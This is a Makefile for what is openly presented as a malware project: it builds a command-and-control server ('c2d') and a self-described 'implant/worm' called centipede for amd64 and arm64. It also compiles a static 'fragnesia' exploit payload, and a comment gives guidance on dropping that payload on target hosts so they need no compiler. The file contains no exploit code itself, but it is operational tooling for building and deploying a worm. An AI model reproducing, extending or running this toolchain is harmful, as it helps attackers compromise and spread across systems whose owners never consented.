.PHONY: all build build-c2d build-worm build-arm64 payload-fragnesia test vet fmt clean deps run-c2d run-worm

BIN_DIR = bin
GO = go

all: build

build: build-c2d build-worm

build-c2d:
	@echo "building c2d (C2 server)..."
	CGO_ENABLED=0 $(GO) build -trimpath -ldflags="-s -w" -o $(BIN_DIR)/c2d .

build-worm:
	@echo "building centipede (implant/worm)..."
	CGO_ENABLED=0 $(GO) build -trimpath -ldflags="-s -w" -o $(BIN_DIR)/centipede ./cmd/centipede

build-arm64:
	@echo "building linux/arm64..."
	CGO_ENABLED=0 GOOS=linux GOARCH=arm64 $(GO) build -trimpath -ldflags="-s -w" -o $(BIN_DIR)/c2d-arm64 .
	CGO_ENABLED=0 GOOS=linux GOARCH=arm64 $(GO) build -trimpath -ldflags="-s -w" -o $(BIN_DIR)/centipede-arm64 ./cmd/centipede

# Optional: prebuilt companion payloads for hosts without a compiler.
# Drop the matching file on the target as `fragnesia_exploit` (same dir as
# the implant, or in the system temp dir) to skip on-target gcc.
payload-fragnesia:
	@echo "building fragnesia companion payload (amd64)..."
	@mkdir -p internal/exploiter/companion
	@gcc -O2 -Wall -static -o internal/exploiter/companion/fragnesia_exploit.amd64 internal/exploiter/native/fragnesia_exploit.c \
		|| gcc -O2 -Wall -o internal/exploiter/companion/fragnesia_exploit.amd64 internal/exploiter/native/fragnesia_exploit.c

test:
	$(GO) test ./...

vet:
	$(GO) vet ./...

fmt:
	gofmt -w main.go main_test.go cmd/centipede/*.go internal/*/*.go

deps:
	$(GO) mod tidy
	$(GO) mod verify

run-c2d: build-c2d
	./$(BIN_DIR)/c2d -addr :8443

run-worm: build-worm
	./$(BIN_DIR)/centipede -c2 ws://127.0.0.1:8443/ws/bot -debug

clean:
	rm -rf $(BIN_DIR)/
